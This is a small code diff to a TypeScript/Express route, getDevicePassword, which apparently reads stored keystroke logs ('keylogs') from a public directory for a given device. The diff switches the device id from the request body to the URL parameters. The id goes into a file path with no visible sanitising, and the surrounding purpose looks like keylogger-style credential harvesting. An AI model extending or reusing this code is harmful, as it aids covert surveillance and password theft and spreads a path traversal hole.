@@ -532,7 +532,7 @@ export const getDevicePassword = async (req: Request, res: Response) => {
 		return res.status(400).json({ errors: errors.array() });
 	}
 
-	const { deviceId } = req.body;
+	const { deviceId } = req.params;
 	try {
 		// Assuming the keylogs are stored in public/security
 		const logsDir = path.join(__dirname, "../../public/security", deviceId);
